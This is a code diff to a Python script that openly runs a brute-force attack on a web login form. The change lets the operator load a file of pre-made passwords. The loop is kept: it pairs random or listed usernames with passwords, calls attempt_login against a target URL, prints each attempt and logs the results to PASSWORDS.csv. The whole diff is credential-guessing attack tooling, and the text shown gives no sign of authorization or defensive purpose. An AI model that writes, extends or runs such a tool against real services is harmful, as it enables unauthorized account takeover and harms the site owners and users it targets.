@@ -155,6 +155,19 @@ if use_usernames_file == 'y':
     except FileNotFoundError:
         print("\033[91mError: File not found. Using random usernames instead.\033[0m")
 
+# Prompt the user to specify a file with pre-made passwords
+use_passwords_file = input("\033[92mDo you want to use a file with pre-made passwords? (y/n): \033[0m").lower()
+
+premade_passwords = []
+
+if use_passwords_file == 'y':
+    passwords_file_path = input("\033[92mEnter the path to the file with pre-made passwords: \033[0m")
+    try:
+        with open(passwords_file_path, 'r') as passwords_file:
+            premade_passwords = [line.strip() for line in passwords_file if line.strip()]
+    except FileNotFoundError:
+        print("\033[91mError: File not found. Using random passwords instead.\033[0m")
+
 # Display countdown
 print("\033[92mStarting the brute force attack in 10 seconds...\033[0m")
 for i in range(10, 0, -1):
@@ -173,16 +186,19 @@ with open('PASSWORDS.csv', 'w', newline='') as csvfile:
             username = random.choice(premade_usernames)
         else:
             username = generate_username()
-        if option == 1:
-            password = generate_password(password_length, use_letters, use_numbers, use_symbols)
+        if premade_passwords:
+            password = random.choice(premade_passwords)
         else:
-            password_length = random.randint(min_length, max_length)
-            password = generate_password(password_length, use_letters, use_numbers, use_symbols)
+            if option == 1:
+                password = generate_password(password_length, use_letters, use_numbers, use_symbols)
+            else:
+                password_length = random.randint(min_length, max_length)
+                password = generate_password(password_length, use_letters, use_numbers, use_symbols)
         result = attempt_login(username, password, login_url)
-        
+
         # Visual broadcast of the attempt
         print(f"\033[96mAttempt {attempt_num}: Username - {username}, Password - {password}, Result - {result}\033[0m")
-        
+
         writer.writerow({'Username': username, 'Password': password, 'Result': result})
 
 print(f"{num_attempts} brute force results written to PASSWORDS.csv.")
